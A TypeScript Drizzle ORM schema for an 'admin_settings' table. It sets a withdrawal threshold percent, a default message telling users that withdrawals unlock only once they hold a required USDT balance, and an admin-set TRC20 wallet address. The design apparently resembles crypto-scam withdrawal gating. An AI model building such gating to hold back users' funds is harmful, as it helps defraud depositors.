import { pgTable, serial, numeric, text, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod/v4";

export const adminSettingsTable = pgTable("admin_settings", {
  id: serial("id").primaryKey(),
  withdrawalThresholdPercent: numeric("withdrawal_threshold_percent", { precision: 5, scale: 2 }).notNull().default("20"),
  withdrawalMessage: text("withdrawal_message").notNull().default("To unlock withdrawals, you need to have at least {required} USDT in your account. Your current USDT balance is {current} USDT."),
  walletAddress: text("wallet_address").notNull().default("TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"),
  network: text("network").notNull().default("TRC20"),
  updatedAt: timestamp("updated_at").notNull().defaultNow(),
});

export const insertAdminSettingsSchema = createInsertSchema(adminSettingsTable).omit({ id: true, updatedAt: true });
export type InsertAdminSettings = z.infer<typeof insertAdminSettingsSchema>;
export type AdminSettings = typeof adminSettingsTable.$inferSelect;
